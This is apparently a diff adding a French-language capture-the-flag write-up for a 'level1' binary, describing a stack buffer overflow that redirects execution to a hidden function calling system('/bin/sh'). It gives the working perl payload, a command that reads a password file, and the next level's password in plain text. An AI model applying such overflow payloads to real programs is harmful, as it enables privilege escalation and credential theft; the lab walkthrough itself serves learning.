@@ -1,0 +1,26 @@
+r < <(perl -e 'print "'`cat ~/.pass > /tmp/a`'","\x90"x52,"\x44\x84\x04\x08"')
+
+buffer 74, pour ecraser EBP sauvgarder +4, pour ecraser EIP sauvgarder + 4
+
+donc pour ecraser la valeur de retour il faut ecricre 76 caracteres puis l'adresse (4 caracteres)
+
+dans le binaire level1 il est impossible de faire nm donc il doit cacher des fuctions.
+avec objdump -D level1 on repere un appelle system dans la function run.
+
+Il faut donc envoyer l'adresse du debut de la function run.
+Etant un Litle Endian les adresses sont inversees.
+
+l'adresse de run dans objddump : 08048444 => little 44 84 04 08
+
+
+on peut remarquer qu il y l'appelle system(/bin/sh)
+
+donc on doit juste garder ouvert les inputs STDIN et STDOU avec un cat -
+
+(perl -e 'print "A"x76,"\x44\x84\x04\x08"' ; cat -) | ./level1
+
+on a un prompt avec les droits de level2;
+
+il suffit de faire un 
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
